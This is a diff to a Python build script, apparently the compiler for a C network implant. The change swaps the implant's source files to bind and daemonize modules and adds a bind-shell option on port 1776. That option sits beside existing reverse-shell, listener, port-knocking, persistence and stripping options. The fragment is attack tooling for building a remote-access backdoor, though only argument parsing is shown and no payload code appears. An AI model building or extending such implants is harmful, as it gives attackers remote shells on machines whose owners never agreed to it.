@@ -15,7 +15,7 @@ import os.path as filesys
 # Execution Guardrails (if Required)
 # Persistence Mechanism (if Required)
 
-implant_c_path = "test.c"
+implant_c_path = "helper.h helper.c bind.c daemonize.c"
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
@@ -48,6 +48,8 @@ parser.add_argument("-pm", "--persistmech", type=str, metavar='',
         help="persistence mechanism", default="unknown")
 
 ##### Attacks #####
+parser.add_argument("-atkB", "--bindShell",type=int, metavar='', 
+        help="run a bind shell on the given port, default is 1776", default=1776)
 parser.add_argument("-atkR", "--reverseShell",action="store_true", 
         help="run a reverse shell")
 parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
